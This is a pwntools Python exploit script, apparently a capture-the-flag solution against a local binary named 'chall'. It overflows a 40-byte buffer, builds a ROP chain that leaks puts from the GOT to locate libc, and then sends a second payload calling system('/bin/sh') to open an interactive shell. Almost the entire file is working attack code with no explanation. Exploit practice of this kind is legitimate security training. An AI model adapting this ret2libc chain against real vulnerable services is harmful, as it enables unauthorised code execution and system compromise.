#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./chall
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./chall')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
init-peda
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

padding = 40

pop_rdi = 0x0000000000401633 # pop rdi; ret;

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

leak = flat([
    asm('nop')*padding,
    pop_rdi,
    exe.got['puts'],
    exe.plt['puts'],
    exe.symbols['main']
])

io.sendlineafter(b"> ", b"3")
io.sendlineafter(b": ", leak)

leaked = u64(io.recvline()[:-1]+b"\x00\x00")


libc.address = leaked - libc.symbols['puts']

print('libc_addr = ' + hex(libc.address))

payload = flat([
    asm('nop')*padding,
    pop_rdi + 1, # ret
    pop_rdi,
    next(libc.search(b"/bin/sh\x00")),
    libc.symbols['system']
])

io.sendlineafter(b"> ", b"3")
io.sendlineafter(b": ", payload)

io.interactive()

